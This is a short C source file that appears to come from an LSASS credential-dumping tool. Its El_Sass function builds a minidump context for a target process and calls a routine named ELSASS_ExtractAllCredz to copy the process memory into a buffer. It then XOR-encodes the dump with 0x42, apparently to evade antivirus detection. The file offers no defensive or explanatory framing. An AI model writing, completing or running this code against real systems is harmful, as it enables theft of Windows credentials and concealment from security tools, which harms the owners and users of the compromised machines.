#include <stdio.h>
#include "AxiomDumper.h"
#include "ElSass.h"

BOOL El_Sass(HANDLE hProcess, const void** bufferAddress, int* bytesReadAddress)
{
    BOOL isDumped = FALSE;
    LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * MEMORY_BUFFER_SIZE_MB);
    DUMPCONTEXT dc = {};

    dc.Signature = 0x504d444d;
    dc.Version = 0xa793;
    dc.ImplementationVersion = 0;
    dc.hProcess = hProcess;
    dc.BaseAddress = dumpBuffer;
    dc.rva = 0;
    dc.DumpMaxSize = DUMP_MAX_SIZE;

    isDumped = ELSASS_ExtractAllCredz(&dc);
    if (isDumped)
    {
        *bufferAddress = dc.BaseAddress;
        *bytesReadAddress = dc.rva;

        char* modifiableBuffer = (char*)dc.BaseAddress;
        for (size_t i = 0; i < dc.rva; i++) {
            modifiableBuffer[i] = modifiableBuffer[i] ^ 0x42;
        }

        return (TRUE);
    }
    return (FALSE);
}

